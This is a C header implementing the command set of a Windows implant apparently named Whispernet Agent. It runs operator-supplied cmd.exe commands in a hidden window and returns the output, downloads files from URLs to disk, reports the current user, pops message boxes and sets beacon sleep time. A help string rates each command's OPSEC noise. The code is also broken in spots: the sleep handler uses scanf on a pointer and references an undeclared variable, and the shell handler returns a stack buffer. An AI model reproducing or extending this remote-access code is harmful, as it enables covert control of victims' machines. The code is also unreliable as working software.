#pragma once

#include <stdio.h>

#include "type_conversions.h"
#include "whisper_config.h"
#include "whisper_json.h"
#include "whisper_winapi.h"

/*
    Baked in commands to Whispernet Agent

    uses things like whisper_winapi to do actions here


    may need to split into .c and .h as well
*/

void get_username(JsonData* response_struct);
int parse_command(char* command, char* args, JsonData*);
void shell(JsonData*, char* args);
void get_file_http(JsonData*, char* args);
void messagebox(JsonData*, char* args);
void sleep(JsonData*, char* args);
void help(JsonData*);

// ====================
// Functions
// ====================

// later - have a seperate parse tree based on if creds are supplied or not, or
// somethign like that...
int parse_command(char* command, char* args, JsonData* response_struct)
{
    if (!response_struct) {
        DEBUG_LOG("[!] response_struct is NULL!\n");
        return -1; // Error case
    }

    DEBUG_LOG("Struct UUID: %s\n",
        response_struct->id); // Correct: Use -> for pointers
    DEBUG_LOG("Struct Data: %s\n", response_struct->data);

    // cant use switch cuz char * is not a single value (intergral type)

    if (strcmp(command, "whoami") == 0) {
        DEBUG_LOG("[COMMAND] whoami\n");
        get_username(response_struct);
    } else if (strcmp(command, "shell") == 0) {
        DEBUG_LOG("[COMMAND] shell\n");
        shell(response_struct, args);
    } else if (strcmp(command, "get_http") == 0) {
        DEBUG_LOG("[COMMAND] get_http...\n");
        get_file_http(response_struct, args);
    } else if (strcmp(command, "messagebox") == 0) {
        DEBUG_LOG("[COMMAND] get_http...\n");
        messagebox(response_struct, args);
    } else if (strcmp(command, "help") == 0) {
        DEBUG_LOG("[COMMAND] help...\n");
        help(response_struct);
    } else if (strcmp(command, "sleep") == 0) {
        DEBUG_LOG("[COMMAND] sleep\n");
        sleep(response_struct, args);
    } else {
        DEBUG_LOG("[COMMAND] Unknown command!\n");
        response_struct->data = "Unknown command";
    }
    return 0;
}
// ====================
// Commands
// ====================

// user based commands
void get_username(JsonData* response_struct)
{
    /*
        Command: whoami, or username, etc.
        No parsing needed for this command

    */
    static WCHAR username[256]; // Static to persist after function returns
    DWORD size = 256;

    if (WhisperGetUserNameW(username, &size)) {
        DEBUG_LOGW(L"Current User: %s\n", username);

        // Convert WCHAR* to UTF-8 char*
        char* utf8_username = wchar_to_utf8(username);
        if (utf8_username) {
            // free previous data (if any) to prevent memory leak, otherwise the
            // previous data here could be left in memory (dangling pointer cuz we
            // lose the pointer if there was anythign there)
            free(response_struct->data);

            // Assign new UTF-8 string to response_struct->data
            response_struct->data = utf8_username;
        }
    } else {
        DEBUG_LOGW(L"Failed to get username. Error: %lu\n", GetLastError());
    }
}

void start_process(JsonData* response_struct) { };
/*
    Command: start-process some.exe or execute
    need to split/remove start-process from command, then call
   WhisperStartProcess[A/W] desc: starts a process/exe.

*/

void get_file_http(JsonData* response_struct, char* args)
{
    /*

    Command:
        get_http http://someexample.com/file.exe C:\myfile.exe

    */

    char* context = NULL; // Required for strtok_s & thread safety.
    char* url = strtok_s(args, " ", &context);
    char* file_path = strtok_s(NULL, " ", &context);

    if (url == NULL || file_path == NULL) {
        DEBUG_LOGF(stderr, "Invalid arguments. Expected: <URL> <FilePath>\n");
        // put message in response struct abuot invalid args
        response_struct->data = "Invalid arguments. Expected: <URL> <FilePath>"; // fine to do this
                                                                                 // like this as it's
                                                                                 // read only.
        return;
    }

    DEBUG_LOG("URL: %s\n", url);
    DEBUG_LOG("File Path: %s\n", file_path);

    if (download_file(url, file_path) == 1) {
        DEBUG_LOG("Something went wrong downloading the file");
        // put error message in response struct
        // fine to do this like this as it's read only.
        response_struct->data = "Something went wrong downloading the file";
        return;
    }

    // fine to do this like this as it's read only.
    response_struct->data = "Successfuly downloaded file";
}

void shell(JsonData* response_struct, char* args)
{
    /*
        Command: shell somecommand
        need to split/remove start-process from command, then call
       WhisperStartProcess[A/W] with cmd.exe desc: runs a shell command. PROLLY
       NOT OPSEC SAFE.

    */

    // ====================
    // INIT stuff
    // ====================
    DEBUG_LOG("ARGS: %s \n", args);
    SECURITY_ATTRIBUTES sa;
    HANDLE hRead, hWrite;
    PROCESS_INFORMATION pi;
    STARTUPINFO si;
    char buffer_PIPE_READ_SIZE_BUFFER[PIPE_READ_SIZE_BUFFER];
    DWORD bytesRead;
    BOOL success;
    // char command[] = "echo Hello, World!";

    // Set up the security attributes struct to allow pipe handles to be inherited
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    // ====================
    // Create Pipe for output
    // ====================
    // Create an anonymous pipe for the child process's STDOUT
    if (!WhisperCreatePipe(&hRead, &hWrite, &sa, 0)) {
        DEBUG_LOGF(stderr, "CreatePipe failed (%lu)\n", GetLastError());
    }
    // Ensure the read handle to the pipe is not inherited
    WhisperSetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    // ====================
    // Create Child Process
    // ====================
    // Set up the STARTUPINFO structure
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.hStdOutput = hWrite;
    si.hStdError = hWrite; // Redirect STDERR as well
    si.dwFlags |= STARTF_USESTDHANDLES;

    // Set up the command line
    char cmdLine[CLI_INPUT_SIZE_BUFFER];
    snprintf(cmdLine, sizeof(cmdLine), "cmd.exe /C \"%s\"", args);

    ZeroMemory(&pi, sizeof(pi));
    success = WhisperCreateProcessA(NULL, cmdLine, NULL, NULL,
        TRUE, // Inherit handles
        CREATE_NO_WINDOW, //hides terminal from popping up
        NULL,
        PROCESS_SPAWN_DIRECTORY, // init dir
        &si, &pi);

    if (!success) {
        DEBUG_LOGF(stderr, "[!] CreateProcess failed (%lu)\n", GetLastError());
        WhisperCloseHandle(hWrite);
        WhisperCloseHandle(hRead);
    }

    // Wait for the child process to finish
    // wait for the process to finsih writing to pipe, OTHERWISE, you'll get weird
    // pipe/NULL outputs
    DEBUG_LOG("[+] Waiting for child process to finish (/write to pipe)...");
    WhisperWaitForSingleObject(pi.hProcess, INFINITE);

    // Close the write end of the pipe in the parent process, once the child is
    // done.
    WhisperCloseHandle(hWrite);

    // ====================
    // Read Pipe
    // ====================

    // Read the output from the child process in chunks. Reads until nothign left
    // in pipe
    DWORD totalBytesRead = 0;
    while (TRUE) {
        success = WhisperReadFile(hRead, buffer_PIPE_READ_SIZE_BUFFER, sizeof(buffer_PIPE_READ_SIZE_BUFFER) - 1,
            &bytesRead, NULL);
        if (!success || bytesRead == 0) {
            break; // No more data to read or read failed
        }

        buffer_PIPE_READ_SIZE_BUFFER[bytesRead] = '\0'; // Null-terminate the string
        DEBUG_LOG("%s", buffer_PIPE_READ_SIZE_BUFFER);
        totalBytesRead += bytesRead;
    }

    // ====================
    // Generate Response
    // ====================

    // put into struct
    free(response_struct->data);
    // Assign new UTF-8 string to response_struct->data
    response_struct->data = buffer_PIPE_READ_SIZE_BUFFER;

    // ====================
    // Cleanup
    // ====================
    WhisperCloseHandle(pi.hProcess);
    WhisperCloseHandle(pi.hThread);
    WhisperCloseHandle(hRead);
}

void messagebox(JsonData* response_struct, char* args) {
    char* context = NULL; // Required for strtok_s & thread safety.
    char* title = strtok_s(args, " ", &context);
    char* message = strtok_s(NULL, " ", &context);

    // Ensure both title and message are not NULL
    if (!title || !message) {
        DEBUG_LOG("[ERROR] messagebox: Expected: <URL> <FilePath>\n");
        return;
    }

    // Call the WhisperMessageBoxA function
    WhisperMessageBoxA(NULL, message, title, MB_OK | MB_ICONINFORMATION);
    response_struct->data = "Message box popped successfully";
}

void sleep(JsonData* response_struct, char* args) {
    char* context = NULL; // Required for strtok_s & thread safety.
    char* sleep_arg = strtok_s(args, " ", &context);
    //char* jitter = strtok_s(NULL, " ", &context);

    if (!sleep_arg) {
        DEBUG_LOG("[ERROR] sleep: Expected: sleep\n");
        return;
    }

    //shitty int check
    if (scanf("%d", &sleep_arg) == 0) {
        DEBUG_LOG("[ERROR] messagebox: Expected: <URL> <FilePath>\n");
        response_struct->data = "[ERROR] sleep: Expected: <int: sleeptime (seconds)>";
        return;
    }

    // If your function wants the value in **seconds**,
// you can either store seconds directly or convert to milliseconds:
    DWORD dwTime = (DWORD)seconds;  // or (DWORD)(seconds * 1000) if needed in ms

    set_sleep_time(dwTime);
    response_struct->data = "Sleep set successfully";
    return;
}
void help(JsonData* response_struct)
{
    const char* help_string = "Help:\n\
> Loud Commands\n\
	http_get: (http_get <str: url> <str: filepath>): Get an HTTP file, and save at the <filpath>\n\
		[ OPSEC: Will write file to disk ]\n\
	shell: (shell <str: command>): Run a command via cmd.exe\n\
		[ OPSEC: Runs a new cmd.exe process ]\n\
	messagebox: (messagebox <str: title> <str: message>): Pop a messagebox with a message\n\
		[ OPSEC: Shows on users screen ]\n\
> Config Commands:\n\
    sleep: (sleep <int: sleeptime (seconds)): How long to sleep for/update sleep time\n\
";

    response_struct->data = help_string;
    return;
}
